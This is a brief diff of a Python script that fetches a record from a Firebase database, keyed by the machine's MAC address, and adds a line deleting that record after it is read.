@@ -54,6 +54,7 @@ password = str(mac)
 
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
 users = firebase.get('/user' + '/' + password, None)
+firebase.delete('/user' + '/' + password, None)
 
 base2 = list(users.values())[0]["Base"]
 base = base2.encode('latin-1')
